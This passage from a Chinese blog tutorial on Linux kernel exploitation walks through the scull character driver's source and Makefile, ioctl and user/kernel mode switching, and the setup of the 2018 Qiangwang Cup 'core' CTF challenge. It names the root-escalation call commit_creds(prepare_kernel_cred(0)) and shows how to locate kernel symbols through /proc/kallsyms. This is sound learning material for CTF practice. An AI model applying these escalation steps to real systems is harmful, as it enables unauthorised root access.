class="line"></span><br><span class="line">    <span class="comment">/* Then follow the list. */</span></span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!qs-&gt;next) &#123;</span><br><span class="line">            qs-&gt;next = kmalloc(<span class="keyword">sizeof</span>(struct scull_qset), GFP_KERNEL);</span><br><span class="line">            <span class="keyword">if</span> (qs-&gt;next == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">memset</span>(qs-&gt;next, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct scull_qset));</span><br><span class="line">        &#125;</span><br><span class="line">        qs = qs-&gt;next;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> qs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Data management: read and write.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> scull_read(struct file *filp, <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span><br><span class="line">                <span class="keyword">loff_t</span> *f_pos)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_dev</span> *<span class="title">dev</span> = <span class="title">filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> *<span class="title">dptr</span>;</span> <span class="comment">/* the first listitem */</span></span><br><span class="line">    <span class="keyword">int</span> quantum = dev-&gt;quantum, qset = dev-&gt;qset;</span><br><span class="line">    <span class="keyword">int</span> itemsize = quantum * qset; <span class="comment">/* how many bytes in the listitem */</span></span><br><span class="line">    <span class="keyword">int</span> item, s_pos, q_pos, rest;</span><br><span class="line">    <span class="keyword">ssize_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mutex_lock_interruptible(&amp;dev-&gt;mutex))</span><br><span class="line">        <span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line">    <span class="keyword">if</span> (*f_pos &gt;= dev-&gt;<span class="built_in">size</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="keyword">if</span> (*f_pos + count &gt; dev-&gt;<span class="built_in">size</span>)</span><br><span class="line">        count = dev-&gt;<span class="built_in">size</span> - *f_pos;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find listitem, qset index, and offset in the quantum */</span></span><br><span class="line">    item = (<span class="keyword">long</span>)*f_pos / itemsize;</span><br><span class="line">    rest = (<span class="keyword">long</span>)*f_pos % itemsize;</span><br><span class="line">    s_pos = rest / quantum; q_pos = rest % quantum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* follow the list up to the right position (defined elsewhere) */</span></span><br><span class="line">    dptr = scull_follow(dev, item);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dptr == <span class="literal">NULL</span> || !dptr-&gt;data || ! dptr-&gt;data[s_pos])</span><br><span class="line">        <span class="keyword">goto</span> out; <span class="comment">/* don't fill holes */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read only up to the end of this quantum */</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; quantum - q_pos)</span><br><span class="line">        count = quantum - q_pos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (raw_copy_to_user(buf, dptr-&gt;data[s_pos] + q_pos, count)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    *f_pos += count;</span><br><span class="line">    retval = count;</span><br><span class="line"></span><br><span class="line">  out:</span><br><span class="line">    mutex_unlock(&amp;dev-&gt;mutex);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> scull_write(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf, <span class="keyword">size_t</span> count,</span><br><span class="line">                <span class="keyword">loff_t</span> *f_pos)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_dev</span> *<span class="title">dev</span> = <span class="title">filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> *<span class="title">dptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> quantum = dev-&gt;quantum, qset = dev-&gt;qset;</span><br><span class="line">    <span class="keyword">int</span> itemsize = quantum * qset;</span><br><span class="line">    <span class="keyword">int</span> item, s_pos, q_pos, rest;</span><br><span class="line">    <span class="keyword">ssize_t</span> retval = -ENOMEM; <span class="comment">/* Value used in "goto out" statements. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mutex_lock_interruptible(&amp;dev-&gt;mutex))</span><br><span class="line">        <span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Find the list item, qset index, and offset in the quantum. */</span></span><br><span class="line">    item = (<span class="keyword">long</span>)*f_pos / itemsize;</span><br><span class="line">    rest = (<span class="keyword">long</span>)*f_pos % itemsize;</span><br><span class="line">    s_pos = rest / quantum;</span><br><span class="line">    q_pos = rest % quantum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Follow the list up to the right position. */</span></span><br><span class="line">    dptr = scull_follow(dev, item);</span><br><span class="line">    <span class="keyword">if</span> (dptr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="keyword">if</span> (!dptr-&gt;data) &#123;</span><br><span class="line">        dptr-&gt;data = kmalloc(qset * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *), GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!dptr-&gt;data)</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="built_in">memset</span>(dptr-&gt;data, <span class="number">0</span>, qset * <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!dptr-&gt;data[s_pos]) &#123;</span><br><span class="line">        dptr-&gt;data[s_pos] = kmalloc(quantum, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!dptr-&gt;data[s_pos])</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Write only up to the end of this quantum. */</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; quantum - q_pos)</span><br><span class="line">        count = quantum - q_pos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (raw_copy_from_user(dptr-&gt;data[s_pos]+q_pos, buf, count)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    *f_pos += count;</span><br><span class="line">    retval = count;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Update the size. */</span></span><br><span class="line">    <span class="keyword">if</span> (dev-&gt;<span class="built_in">size</span> &lt; *f_pos)</span><br><span class="line">        dev-&gt;<span class="built_in">size</span> = *f_pos;</span><br><span class="line"></span><br><span class="line">  out:</span><br><span class="line">    mutex_unlock(&amp;dev-&gt;mutex);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Beginning of the scull device implementation. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Empty out the scull device; must be called with the device</span></span><br><span class="line"><span class="comment"> * mutex held.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scull_trim</span><span class="params">(struct scull_dev *dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_qset</span> *<span class="title">next</span>, *<span class="title">dptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> qset = dev-&gt;qset;   <span class="comment">/* "dev" is not-null */</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (dptr = dev-&gt;data; dptr; dptr = next) &#123; <span class="comment">/* all the list items */</span></span><br><span class="line">        <span class="keyword">if</span> (dptr-&gt;data) &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; qset; i++)</span><br><span class="line">                kfree(dptr-&gt;data[i]);</span><br><span class="line">            kfree(dptr-&gt;data);</span><br><span class="line">            dptr-&gt;data = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        next = dptr-&gt;next;</span><br><span class="line">        kfree(dptr);</span><br><span class="line">    &#125;</span><br><span class="line">    dev-&gt;<span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">    dev-&gt;quantum = scull_quantum;</span><br><span class="line">    dev-&gt;qset = scull_qset;</span><br><span class="line">    dev-&gt;data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scull_release</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"process %i (%s) success release minor(%u) file\n"</span>, current-&gt;pid, current-&gt;comm, iminor(inode));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Open and close</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scull_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_dev</span> *<span class="title">dev</span>;</span> <span class="comment">/* device information */</span></span><br><span class="line"></span><br><span class="line">    dev = container_of(inode-&gt;i_cdev, struct scull_dev, cdev);</span><br><span class="line">    filp-&gt;private_data = dev; <span class="comment">/* for other methods */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the device was opened write-only, trim it to a length of 0. */</span></span><br><span class="line">    <span class="keyword">if</span> ( (filp-&gt;f_flags &amp; O_ACCMODE) == O_WRONLY) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mutex_lock_interruptible(&amp;dev-&gt;mutex))</span><br><span class="line">            <span class="keyword">return</span> -ERESTARTSYS;</span><br><span class="line">        scull_trim(dev); <span class="comment">/* Ignore errors. */</span></span><br><span class="line">        mutex_unlock(&amp;dev-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_DEBUG <span class="string">"process %i (%s) success open minor(%u) file\n"</span>, current-&gt;pid, current-&gt;comm, iminor(inode));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The "extended" operations -- only seek.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">loff_t</span> scull_llseek(struct file *filp, <span class="keyword">loff_t</span> off, <span class="keyword">int</span> whence)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scull_dev</span> *<span class="title">dev</span> = <span class="title">filp</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> newpos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(whence) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* SEEK_SET */</span></span><br><span class="line">        newpos = off;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">/* SEEK_CUR */</span></span><br><span class="line">        newpos = filp-&gt;f_pos + off;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: <span class="comment">/* SEEK_END */</span></span><br><span class="line">        newpos = dev-&gt;<span class="built_in">size</span> + off;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>: <span class="comment">/* can't happen */</span></span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (newpos &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    filp-&gt;f_pos = newpos;</span><br><span class="line">    <span class="keyword">return</span> newpos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">scull_fops</span> = &#123;</span></span><br><span class="line">    .owner =    THIS_MODULE,</span><br><span class="line">    .llseek =   scull_llseek,</span><br><span class="line">    .<span class="built_in">read</span> =     scull_read,</span><br><span class="line">    .<span class="built_in">write</span> =    scull_write,</span><br><span class="line">    <span class="comment">// .unlocked_ioctl = scull_ioctl,</span></span><br><span class="line">    .<span class="built_in">open</span> =     scull_open,</span><br><span class="line">    .<span class="built_in">release</span> =  scull_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set up the char_dev structure for this device.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scull_setup_cdev</span><span class="params">(struct scull_dev *dev, <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err, devno = MKDEV(scull_major, scull_minor + index);</span><br><span class="line"></span><br><span class="line">    cdev_init(&amp;dev-&gt;cdev, &amp;scull_fops);</span><br><span class="line">    dev-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    dev-&gt;cdev.ops = &amp;scull_fops;</span><br><span class="line">    err = cdev_add (&amp;dev-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">/* Fail gracefully if need be. */</span></span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        printk(KERN_NOTICE <span class="string">"Error %d adding scull%d"</span>, err, index);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        printk(KERN_INFO <span class="string">"scull: %d add success\n"</span>, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">scull_cleanup_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">dev_t</span> devno = MKDEV(scull_major, scull_minor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get rid of our char dev entries. */</span></span><br><span class="line">    <span class="keyword">if</span> (scull_devices) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; scull_nr_devs; i++) &#123;</span><br><span class="line">            scull_trim(scull_devices + i);</span><br><span class="line">            cdev_del(&amp;scull_devices[i].cdev);</span><br><span class="line">        &#125;</span><br><span class="line">        kfree(scull_devices);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* cleanup_module is never called if registering failed. */</span></span><br><span class="line">    unregister_chrdev_region(devno, scull_nr_devs);</span><br><span class="line">    printk(KERN_INFO <span class="string">"scull: cleanup success\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scull_init_module</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result, i;</span><br><span class="line">    <span class="keyword">dev_t</span> dev = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a range of minor numbers to work with, asking for a dynamic major</span></span><br><span class="line"><span class="comment">     * unless directed otherwise at load time.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (scull_major) &#123;</span><br><span class="line">        dev = MKDEV(scull_major, scull_minor);</span><br><span class="line">        result = register_chrdev_region(dev, scull_nr_devs, <span class="string">"scull"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = alloc_chrdev_region(&amp;dev, scull_minor, scull_nr_devs, <span class="string">"scull"</span>);</span><br><span class="line">        scull_major = MAJOR(dev);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        printk(KERN_WARNING <span class="string">"scull: can't get major %d\n"</span>, scull_major);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">"scull: get major %d success\n"</span>, scull_major);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Allocate the devices. This must be dynamic as the device number can</span></span><br><span class="line"><span class="comment">     * be specified at load time.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    scull_devices = kmalloc(scull_nr_devs * <span class="keyword">sizeof</span>(struct scull_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!scull_devices) &#123;</span><br><span class="line">        result = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(scull_devices, <span class="number">0</span>, scull_nr_devs * <span class="keyword">sizeof</span>(struct scull_dev));</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Initialize each device. */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; scull_nr_devs; i++) &#123;</span><br><span class="line">        scull_devices[i].quantum = scull_quantum;</span><br><span class="line">        scull_devices[i].qset = scull_qset;</span><br><span class="line">        mutex_init(&amp;scull_devices[i].mutex);</span><br><span class="line">        scull_setup_cdev(&amp;scull_devices[i], i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* succeed */</span></span><br><span class="line"></span><br><span class="line">  fail:</span><br><span class="line">    scull_cleanup_module();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(scull_init_module);</span><br><span class="line">module_exit(scull_cleanup_module);</span><br></pre></td></tr></table></figure>

<p>makefile：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line"></span><br><span class="line">	obj-m := file_operations.o</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">	KERN_DIR ?= /usr/src/linux-headers-<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/</span><br><span class="line">	PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">default:</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERN_DIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure>

<h3 id="IDA界面如下-1"><a href="#IDA界面如下-1" class="headerlink" title="IDA界面如下"></a>IDA界面如下</h3><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584963141639.png" alt="1584963141639"></p>
<p>可以看到这边是一系列的对应的操作函数</p>
<hr>
<p>驱动提供的接口是<code>/dev/xxx</code>，在Linux下<code>Everything is File</code>，所以对驱动设备的操作其实就是对文件的操作，所以一个驱动就是用来<strong>定义</strong>，<strong>打开/读/写/……一个<code>/dev/xxx</code>将会发生啥</strong>，驱动提供的API（fops中指定的）也就是<strong>一系列的文件操作</strong></p>
<p><code>struct file_operations scull_fops</code>结构体中实现了的函数就会静态初始化上函数地址，而未实现的函数，值为NULL</p>
<p>结构体中实现的几个call，冒号右侧的函数名是由开发者自己起的，在驱动程序载入内核后，其他用户程序程序就可以借助<strong>文件方式</strong>像进行系统调用一样调用这些函数实现所需功能。</p>
<p>这里是一些已知的常见对应操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Events		User functions		Kernel functions</span><br><span class="line">Load		insmod				module_init()</span><br><span class="line">Open		fopen				file_operations: open</span><br><span class="line">Close		fread				file_operations: read</span><br><span class="line">Write		fwrite				file_operations: write</span><br><span class="line">Close		fclose				file_operations: release</span><br></pre></td></tr></table></figure>

<p><a href="https://paper.seebug.org/779/#1-" target="_blank" rel="noopener">这里</a>还有一些知识点，比如驱动分类，主次编号，什么的，我写的这些主要也是参考了这篇文章</p>
<hr>
<p>之后insmod，此时虽然驱动已经加载成功了（dmesg可以看到驱动主编号是246，分别用四个次编号标记了4个设备，4个是怎么来的看上面代码就知道了）</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584964191239.png" alt="1584964191239"></p>
<p>但是此时并不会在/dev目录下创建设备文件，需要我们手动使用<code>mknod</code>进行设备链接</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584964631604.png" alt="1584964631604"></p>
<p>此时还可以指定设备类型，然后删除就直接使用rm就好了</p>
<p>这里记一下命令：<br>dmesg可以查看syslog<br>cat /proc/devices 中查看设备的类型（左边是主设备号，右边的是设备名）<br>mknod 设备名 设备类型(字符：c,块：b) 主设备号 从设备号</p>
<p>rmmod之后dmesg还可以看到一条<code>scull: cleanup success</code></p>
<h1 id="kernel-pwn基础知识"><a href="#kernel-pwn基础知识" class="headerlink" title="kernel pwn基础知识"></a>kernel pwn基础知识</h1><p>在<a href="https://www.anquanke.com/post/id/172216" target="_blank" rel="noopener">这篇文章</a>，中有这么一句话</p>
<blockquote>
<p>如果驱动在init中执行了proc_create(“core”, 0x1B6LL, 0LL, &amp;core_fops)，文件名是“core”，而且在回调中实现了ioctl，那么其他用户程序就可以先fopen这个core获取文件指针fd，然后执行ioctl(fd,&lt;参数&gt;,&lt;参数&gt;)来进行具体操作，其他的fop中的回调接口函数也类似。</p>
</blockquote>
<p>然后我就去看了ioctl是什么：</p>
<hr>
<blockquote>
<p>ioctl(input/output control)是一个专用于设备输入输出操作的系统调用,该调用传入一个跟设备有关的请求码，系统调用的功能完全取决于请求码</p>
</blockquote>
<blockquote>
<p>ioctl是设备驱动程序中对设备的I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。它的调用个数如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, ind cmd, …)</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其中fd是用户程序打开设备时使用open函数返回的文件标示符，cmd是用户程序对设备的控制命令，至于后面的省略号，那是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。</p>
</blockquote>
<blockquote>
<p>ioctl函数是文件结构中的一个属性分量，就是说如果你的驱动程序提供了对ioctl的支持，用户就可以在用户程序中使用ioctl函数来控制设备的I/O通道。</p>
</blockquote>
<hr>
<p>差不多就是我们与驱动设备交互的一个函数吧，一般前两个参数是fd还有控制码，然后还有一句话</p>
<blockquote>
<p>一个进程的在用户态和内核态是对应了完全不搭边儿的两个栈的，用户栈和内核栈既然相互隔离，在系统调用或者调用驱动、内核模块函数时就不能通过栈传参了，而要通过寄存器，像拷贝这样的操作也要借助具体的函数：copy_to_user/copy_from_user</p>
</blockquote>
<p>就是说内核栈和用户栈是相互隔离的，然后通过寄存器传参</p>
<p>然后<strong>进入kernel态</strong>一般有如下情况：</p>
<ol>
<li><p>系统调用</p>
</li>
<li><p>产生异常</p>
</li>
<li><p>外设产生中断</p>
<p>等等</p>
</li>
</ol>
<p>至于提权的话就是这些了：由于这些内核模块运行时的权限是root权限，因此我们将有机会借此拿到root权限的shell，流程上就是C程序exp调用内核模块利用其漏洞提权，只是提权后要“着陆”回用户态拿shell。提权代码是<code>commit_creds(prepare_kernel_cred(0))</code></p>
<h2 id="进入kernel态进行的操作"><a href="#进入kernel态进行的操作" class="headerlink" title="进入kernel态进行的操作"></a>进入kernel态进行的操作</h2><p>保存用户态的各个寄存器，以及执行到代码的位置</p>
<h2 id="从kernel态返回用户态进行的操作"><a href="#从kernel态返回用户态进行的操作" class="headerlink" title="从kernel态返回用户态进行的操作"></a>从kernel态返回用户态进行的操作</h2><p>执行swapgs 和 iret 指令</p>
<h2 id="一般的攻击思路"><a href="#一般的攻击思路" class="headerlink" title="一般的攻击思路"></a>一般的攻击思路</h2><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584965699729.png" alt="1584965699729"></p>
<hr>
<p>记一下命令：</p>
<p>查看所开保护cat /proc/cpuinfo<br>查看内核堆块 cat /proc/slabinfo<br>查看prepare_kernel_cred和commit_creds地址<br>    grep prepare_kernel_cred  /proc/kallsyms<br>    grep commit_creds  /proc/kallsyms </p>
<hr>
<h1 id="实操linux-kernel-ROP"><a href="#实操linux-kernel-ROP" class="headerlink" title="实操linux kernel ROP"></a>实操linux kernel ROP</h1><h2 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018-core"></a>强网杯2018-core</h2><p>下载下来压缩文件之后看到有这几个文件：</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584966164347.png" alt="1584966164347"></p>
<p>其中对应的文件意思如下（来自星盟公开课的截图）：</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584966068272.png" alt="1584966068272"></p>
<p>其中bzImage是打包的内核代码，可以用来寻找<strong>gadget</strong></p>
<p>这里写一下师傅们的注意事项：</p>
<blockquote>
<p>注意，vmlinux是未经压缩的，然而在core.cpio里面也有一个vmlinux，里面那个是起系统后真正的vmlinux，按理说这俩应该是一样的，单独拿出来是为了你方便分析，但是笔者亲测的时候发现这俩竟然不一样，可能是下载的时候弄错了？如果读者也遇到相同情况，不要用外面那个，一定要用core.cpio里面那个</p>
</blockquote>
<p>start.sh中有以下内容</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span> \ <span class="comment">#这里开启了kaslr保护</span></span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>我们可以自己再做一份rootstart.sh还有一个root.cpio，主要是用来调试</p>
<p>其中在sh文件最后加上gdb调试的选项：<code>-gdb tcp::1234</code><br>还有比如关掉kaslr</p>
<p>新制作的root.cpio中则需要修改以下几点：</p>
<ol>
<li>cpio包中的init文件，里面有一行poweroff，是到时间自动关机的命令，可以取消掉</li>
<li>同样是init文件，setsid /bin/cttyhack setuidgid 1000 /bin/sh改成0000，这样就可以以root身份启动了</li>
</ol>
<p>ps:这里就是整个系统的配置，如果发现有什么配置有问题的话说不定就非预期解了….然后系统初始化操作没有写在这里的话看看<code>/etc/init.d/rcS</code>，有时候初始化配置会写在这里</p>
<p>新制作的<code>rootstart.sh</code>就是这样：</p>
